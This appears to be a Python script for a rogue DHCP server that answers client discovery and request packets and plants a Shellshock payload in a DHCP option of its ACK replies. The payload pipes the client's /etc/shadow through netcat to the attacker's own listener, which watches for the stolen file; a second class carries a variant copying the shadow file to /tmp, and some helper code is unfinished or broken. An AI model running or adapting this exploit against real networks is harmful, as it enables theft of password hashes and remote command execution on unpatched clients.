import socket
import select
from binascii import hexlify
import collections
import time


def flatten_list(ze_list):
    for sublist in ze_list:
        if isinstance(sublist, collections.Iterable) and not isinstance(sublist, (str, bytes)):
            yield from flatten_list(sublist)
        else:
            yield sublist


class Listener:
    def __init__(self):
        self.client_list = []
        self.current_discovery = []



        self.dhcp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.dhcp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

        # self.recv_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # self.send_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    def start(self):

        self.dhcp_socket.bind(('', 67))
        # self.dhcp_socket.listen(5)


        while True:
            r, w, x = select.select([self.dhcp_socket], [], [])

            for each in r:
                print('Recieved Something!')
                frame, void = each.recvfrom(10000)
                print(void)
                time.sleep(5)
                print(frame)

                if frame.startswith(b'root'):
                    print('[!] Got shadow file')
                    print(frame)
                    exit()
                    break


                dhcp_message = [frame[i:i+1] for i in range(0, len(frame), 1)]
                dhcpPacket = DhcpPacket(dhcp_message)


                if dhcpPacket.op == [b'\x02']:
                    # This is a reply not a request, it has come from a dhcp server and is junk
                    break

                print(dhcpPacket.op)
                time.sleep(2)

                # Check for current transaction
                for eachPacket in self.current_discovery:
                    if eachPacket.xid == dhcpPacket.xid:
                        print('[+] Crafting ACK')
                        ack = eachPacket.craft_ack()
                        self.dhcp_socket.sendto(ack, ('255.255.255.255', 68))
                        self.client_list.append(x)
                        print(self.current_discovery)
                        self.current_discovery.remove(eachPacket)

                # if any(x.xid == dhcpPacket.xid for x in self.current_discovery):
                #     print('[+] Crafting ACK')
                #     ack = dhcpPacket.craft_ack()
                #     self.dhcp_socket.sendto(ack, ('255.255.255.255', 68))
                #     self.client_list.append(x)
                #     print(self.current_discovery)
                #     for each in self.current_discovery:
                #         if each.xid == dhcpPacket.xid:
                #             self.current_discovery.remove(each)

                else:
                    print('[+] Crafting offer')
                    self.current_discovery.append(dhcpPacket)
                    offer = dhcpPacket.craft_offer()
                    print(offer)
                    self.dhcp_socket.sendto(offer, ('255.255.255.255', 68))






class DhcpPacket:
    def __init__(self, dhcp_message):
        # print(dhcp_message)
        # print(len(dhcp_message))
        self.exploit = b"() { :;};/bin/cat/ /etc/shadow | nc -u 192.168.0.23 67"  # % (self.ip, self.port)
        self.exploit = [bytes(chr(x).encode('ascii')) for x in self.exploit]
        # print(self.exploit)
        # print(len(self.exploit))
        self.exploit_len = (len(self.exploit)).to_bytes(1, byteorder='big')
        # print(self.exploit_len)

        frame = dhcp_message

        # binary
        self.op = [frame[0]]  # REquest or reply
        # print(self.op)
        self.htype = [frame[1]]  # Hardware address type
        # print(self.htype)
        self.hlen = [frame[2]]  # Hardware length
        # print(self.hlen)
        self.hops = [frame[3]]  # hops; number of relay agents the message travels through, each one will add one
        # print(self.hops)
        self.xid = frame[4:8]  # Transaction ID a random bumber chosen by the client to identify an ip address allocation
        # print(self.xid)
        self.secs = frame[8:10]  # number of seconds elapsed since clent sent a dhcp request
        # print(self.secs)
        self.flags = frame[10:12]  # leftmodt bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
        # print(self.flags)
        self.ciaddr = frame[12:16]  # client ip address
        # print(self.ciaddr)
        self.yiaddr = frame[16:20]  # 'your' ip address, as assigned by server
        # print(self.yiaddr)
        self.siaddr = frame[20:24]  # Server ip address
        # print(self.siaddr)
        self.giaddr = frame[24:28]  # first relay agent ip address
        # print(self.giaddr)
        self.chaddr = frame[28:44]  # client hardware address
        # print(self.chaddr)
        self.sname = frame[44:108]  # server host name
        # print(len(self.sname))
        # print(self.sname)
        self.file = frame[108:236]  # boot file name, routing information defined by server to the client // legacy
        # print(len(self.file))
        # print(self.file)
        self.magic_cookie = frame[236:240]
        # print(self.magic_cookie)
        self.options = frame[240:]  # additional parameters

        # print(self.options)

        self.options = self.breakup_options(self.options)

        self.offer = None
        self.ack = None

    def craft_offer(self):
        op = [b'\x02']  # request=01 or reply=02
        htype = [b'\x01']  # Hardware address type 01=ethernet
        hlen = [b'\x06']  # Hardware length
        hops = self.hops  # hops; number of relay agents the message travels through, each one will add one
        xid = self.xid  # Transaction ID a random number chosen by the client to identify an ip address allocation
        secs = self.secs  # number of seconds elapsed since clent sent a dhcp request
        flags = self.flags  # leftmost bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
        ciaddr = self.ciaddr  # client ip address
        yiaddr = dhcpServer.get_next_ip()  # 'your' ip address, as assigned by server
        self.yiaddr = yiaddr
        siaddr = dhcpServer.server_ip  # Server ip address
        self.siaddr = siaddr
        giaddr = self.giaddr  # first relay agent ip address
        chaddr = self.chaddr  # client hardware address
        sname = self.sname  # server host name
        file = self.file  # bootfile name, routing information defined by server to the client
        magic_cookie = [b'\x63', b'\x82', b'\x53', b'\x63']
        options = [b'\x35', b'\x01', b'\x02',  # DHCP, len, Offer
                   b'\x01', b'\x04', dhcpServer.client_subnet,  # subnetmask flag on, len=4, subnetmask
                   b'\x3a', b'\x04', b'\x00', b'\x00', b'\x07', b'\x08',  # Renewel time
                   b'\x3b', b'\x04', b'\x00', b'\x00', b'\x07', b'\x08',  # rebind time value
                   b'\x33', b'\x04', b'\x00', b'\x00', b'\x0e', b'\x10',  # lease time
                   b'\x36', b'\x04', b'\xc0', b'\xa8', b'\x6e', b'\x17', # DHCP server identifier (ip address)
                   # b'\x72', self.exploit_len, self.exploit, # () { :;}; echo vulnerable’ bash -c “echo test” # the exploit
                   b'\xff',  # end flag
                   # padding to end at word boundry for the options
                   ]

        options = list(flatten_list(options))

        return_packet = [op, htype, hlen, hops, xid, secs, flags, ciaddr, yiaddr, siaddr, giaddr, chaddr, sname,
                         file, magic_cookie, options]
        print(return_packet)

        return_packet = [item for sublist in return_packet for item in sublist]
        print(return_packet)
        return_packet = b''.join(return_packet)
        return return_packet

    def craft_ack(self):

        # binary
        op = [b'\x02']  # REquest or reply
        htype = [b'\x01']  # Hardware address type
        hlen = [b'\x06']  # Hardware length
        hops = self.hops  # hops; number of relay agents the message travels through, each one will add one
        xid = self.xid  # Transaction ID a random bumber chosen by the client to identify an ip address allocation
        secs = self.secs  # number of seconds elapsed since clent sent a dhcp request
        flags = self.flags # leftmodt bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
        ciaddr = self.ciaddr  # client ip address
        yiaddr = self.yiaddr  # 'your' ip address, as assigned by server
        siaddr = self.siaddr  # Server ip address
        giaddr = self.giaddr  # first relay agent ip address
        chaddr = self.chaddr  # client hhardware address
        sname = self.sname  # server host name
        file = self.file  # bootfile name, routing information defined by server to the client
        magic_cookie = [b'\x63', b'\x82', b'\x53', b'\x63']
        options = [b'\x35', b'\x01', b'\x05',  # DHCP, len, Offer
                   b'\x01', b'\x04', dhcpServer.client_subnet,  # subnetmask flag on, len=4, subnetmask
                   b'\x03', b'\x04', dhcpServer.router_ip,
                   #b'\x06', b'\x05', dhcpServer.primary_dns,
                   b'\x3a', b'\x04', b'\x00', b'\x00', b'\x07', b'\x08',  # Renewel time
                   b'\x3b', b'\x04', b'\x00', b'\x00', b'\x07', b'\x08',  # rebind time value
                   b'\x33', b'\x04', b'\x00', b'\x00', b'\x0e', b'\x10',  # lease time
                   b'\x36', b'\x04', b'\xc0', b'\xa8', b'\00', b'\x17',  # DHCP server identifier (ip address)
                   b'\x72', self.exploit_len, self.exploit, # () { :;}; echo vulnerable’ bash -c “echo test” # the exploit
                   b'\xff',  # end flag
                   # padding to end at word boundry for the options
                   ]

        options = list(flatten_list(options))

        return_packet = [op, htype, hlen, hops, xid, secs, flags, ciaddr, yiaddr, siaddr, giaddr, chaddr, sname,
                         file, magic_cookie, options]
        print(return_packet)

        return_packet = [item for sublist in return_packet for item in sublist]
        print(return_packet)
        return_packet = b''.join(return_packet)
        return return_packet

    def breakup_options(self, option_string):
        print('[+] breaking up options')
        cur = 0
        option_string = [x for x in option_string]
        # print(option_string)
        options = []
        while True:
            # try:
            flag = option_string[cur]
            # print('[Flag] %s' % str(flag))
            if flag == b'\xff':
                break
            cur += 1
            length = option_string[cur]
            # print('[Length] %s' % str(length))
            cur += 1
            # TURN LENGTH INTO AN INT
            values = option_string[cur:ord(length) + cur]
            #values = option_string[cur:int(length, 16) + cur]
            # print('[Values] %s' % str(values))
            #cur += int(length, 16)
            cur += ord(length)

            option = self.Option(flag, length, values)
            options.append(option)

            # except:
            #     # print('Error with options breakup')
            #     pass

        return options

    class Option:
        def __init__(self, flag, length, values):
            self.flag = flag
            self.length = length
            self.values = values

            print(flag, length, values)



class Client:
    def __init__(self, dhcpPacket):
        self.ip = dhcpPacket.ciaddr
        self.physical_address = dhcpPacket.chaddr


''' parts of code to be implented below'''


class DhcpServer:
    def __init__(self):
        self.server_ip = (b'\xc0', b'\xa8', b'\x00', b'\x17')
        self.server_name = (b'\x6c', b'\x61', b'\x70', b'\x70', b'\x79')
        self.router_ip = (b'\xc0', b'\xa8', b'\x00', b'\x17')
        self.primary_dns =  (b'\xc0', b'\xa8', b'\x00', b'\x17')
        self.client_ip_available = [(b'\xc0', b'\xa8', b'\x00', b'\x01'), (b'\xc0', b'\xa8', b'\x00', b'\x02')]
        self.client_subnet = (b'\xff', b'\xff', b'\xff', b'\x00')

    def get_next_ip(self):
        print(self.client_ip_available)
        ip = self.client_ip_available.pop()
        print('[+] Assigning ip Address: %s' % str(ip))
        return ip


class PacketFrameHex:
    def __init__(self, frame):
        self.frame = frame
        self.exploit = [(x) for x in b"() { :;}; /usr/bin/cat /etc/shadow > /tmp/shadow"]
        self.exploit_len = hex(len(self.exploit))

    def recieve_discovery(self):
        frame = self.frame
        # binary
        self.op = [frame[0]] # REquest or reply
        self.htype = [frame[1]] # Hardware address type
        self.hlen = [frame[2]]  # Hardware length
        self.hops = [frame[3]] # hops; number of relay agents the message travels through, each one will add one
        self.xid = frame[4:8] # Transaction ID a random bumber chosen by the client to identify an ip address allocation
        self.secs = frame[8:10] # number of seconds elapsed since clent sent a dhcp request
        self.flags = frame[10:12] # leftmodt bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
        self.ciaddr = frame[12:16] # client ip address
        self.yiaddr = frame[16:20] # 'your' ip address, as assigned by server
        self.siaddr = frame[20:24] # Server ip address
        self.giaddr = frame[24:28] # first relay agent ip address
        self.chaddr = frame[29:45] # client hhardware address
        self.sname = frame[45:109] # server host name
        self.file = frame[109:237] #bootfile name, routing information defined by server to the client
        self.options = frame[227:] # additional parameters

    def craft_offer(self, dhcpServer):
        frame = self.frame
        op = ['02']  # REquest=ff or reply=00
        htype = ['01']  # Hardware address type 01=ethernet
        hlen = ['06']  # Hardware length
        hops = self.hops  # hops; number of relay agents the message travels through, each one will add one
        xid = self.xid  # Transaction ID a random number chosen by the client to identify an ip address allocation
        secs = self.secs  # number of seconds elapsed since clent sent a dhcp request
        flags = self.flags  # leftmodt bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
        ciaddr = self.ciaddr  # client ip address
        yiaddr = dhcpServer.get_next_ip()  # 'your' ip address, as assigned by server
        siaddr = dhcpServer.server_ip  # Server ip address
        giaddr = self.giaddr  # first relay agent ip address
        chaddr = self.chaddr  # client hardware address
        sname = self.sname  # server host name
        file = self.file  # bootfile name, routing information defined by server to the client
        options = frame[237:]  # additional parameters

        options = ['53', '01', '02'  # DHCP, len, Offer
                   '01', '04' , 'ff', 'ff', 'ff', '00' # subnetmask flag on, len=4, subnetmask
                   ## NEED A RENEWL TIME VALUE FLAG HERE
                   ## NEED A REBINDING TIME VALUE FLAG HERE
                   '33', '04', '00', '00', '0e', '10' # lease time
                   '36', '04', 'c0', 'a8', '00', '01' # DHCP server identifier
                   # () { :;}; echo vulnerable’ bash -c “echo test” # the exploit
                   '72', self.exploit_len, self.exploit,
                   # NEED DHCP SERVER FLAG HERE
                   'ff' # end flag
                   # NEED PADDING HERE FOR UNUSED FLAGS
                   ]

    def recieve_request(self):
        frame = self.frame
        # binary
        self.op = [frame[0]]  # REquest or reply
        self.htype = [frame[1]]  # Hardware address type
        self.hlen = [frame[2]]  # Hardware length
        self.hops = [frame[3]]  # hops; number of relay agents the message travels through, each one will add one
        self.xid = frame[
                   4:8]  # Transaction ID a random bumber chosen by the client to identify an ip address allocation
        self.secs = frame[8:10]  # number of seconds elapsed since clent sent a dhcp request
        self.flags = frame[
                     10:12]  # leftmodt bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
        self.ciaddr = frame[12:16]  # client ip address
        self.yiaddr = frame[16:20]  # 'your' ip address, as assigned by server
        self.siaddr = frame[20:24]  # Server ip address
        self.giaddr = frame[24:28]  # first relay agent ip address
        self.chaddr = frame[29:45]  # client hhardware address
        self.sname = frame[45:109]  # server host name
        self.file = frame[109:237]  # bootfile name, routing information defined by server to the client
        self.options = frame[227:]  # additional parameters

    def craft_ack(self):
        frame = self.frame
        # binary
        self.op = ['02']  # REquest or reply
        self.htype = ['01']  # Hardware address type
        self.hlen = ['06']  # Hardware length
        self.hops = [self.hops]  # hops; number of relay agents the message travels through, each one will add one
        self.xid = [self.xid]  # Transaction ID a random bumber chosen by the client to identify an ip address allocation
        self.secs = ['00', '00']  # number of seconds elapsed since clent sent a dhcp request
        self.flags = ['00', '00']  # leftmodt bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
        self.ciaddr = ['00','00','00','00']  # client ip address
        self.yiaddr = [self.yiaddr]  # 'your' ip address, as assigned by server
        self.siaddr = [self.siaddr]  # Server ip address
        self.giaddr = ['00', '00', '00', '00']  # first relay agent ip address
        self.chaddr = [self.chaddr]  # client hhardware address
        self.sname = [self.sname]  # server host name
        self.file = [self.file]  # bootfile name, routing information defined by server to the client
        options = ['53', '01', '02'  # DHCP, len, Offer
                   '01', '04', 'ff', 'ff', 'ff', '00'  # subnetmask flag on, len=4, subnetmask
                   ## NEED A RENEWL TIME VALUE FLAG HERE
                   ## NEED A REBINDING TIME VALUE FLAG HERE
                   '33', '04', '00', '00', '0e', '10'  # lease time
                   '36', '04', 'c0', 'a8', '00',
                   '01'  # DHCP server identifier
                   # () { :;}; echo vulnerable’ bash -c “echo test” # the exploit
                   '72', self.exploit_len, self.exploit,
                   # NEED DHCP SERVER FLAG HERE
                   'ff'  # end flag
                   # NEED PADDING HERE FOR UNUSED FLAGS
                   ]
        return None





    def print_frame(self):
        print(
            len(self.op),
            len(self.htype),
            len(self.hlen),
            len(self.hops),
            len(self.xid),
            len(self.secs),
            len(self.flags) ,
            len(self.ciaddr) ,
            len(self.yiaddr) ,
            len(self.siaddr) ,
            len(self.giaddr) ,
            len(self.chaddr) ,
            len(self.sname) ,
            len(self.file) ,
            len(self.options))
        print(
            (self.op),
            (self.htype),
            (self.hlen),
            (self.hops),
            (self.xid),
            (self.secs),
            (self.flags),
            (self.ciaddr),
            (self.yiaddr),
            (self.siaddr),
            (self.giaddr),
            (self.chaddr),
            (self.sname),
            (self.file),
            (self.options))

def saver():
    return None



def main():
    global dhcpServer
    dhcpServer = DhcpServer()

    listener = Listener()
    listener.start()

# UI
def main_main():
    # dhcpServer = DhcpServer()
    client_list = []

    # a samoke dhcp_discover frame with ehternet header
    dhcp_discover = '''
\xff\xff\xff\xff\xff\xff\x00\x0b\x82\x01\xfc\x42\x08\x00\x45\x00
\x01\x2c\xa8\x36\x00\x00\xfa\x11\x17\x8b\x00\x00\x00\x00\xff\xff
\xff\xff\x00\x44\x00\x43\x01\x18\x59\x1f\x01\x01\x06\x00\x00\x00
\x3d\x1d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x0b\x82\x01\xfc\x42\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x63\x82\x53\x63\x35\x01\x01\x3d\x07\x01
\x00\x0b\x82\x01\xfc\x42\x32\x04\x00\x00\x00\x00\x37\x04\x01\x03
\x06\x2a\xff\x00\x00\x00\x00\x00\x00\x00'''

    dhcp_discover.replace('\n', '')
    dhcp_discover = dhcp_discover.split(' ')
    dhcp_discover = [x for x in dhcp_discover if x is not '']

    ethernet_header, ip_header, udp_header, dhcp_discover = dhcp_discover[0:14], dhcp_discover[14:34], dhcp_discover[34:42], dhcp_discover[42:]

    packetFrameHex = PacketFrameHex(dhcp_discover)
    packetFrameHex.print_frame()
    packetFrameHex.craft_offer(dhcpServer)
    # listener()



if __name__ == '__main__':
    main()
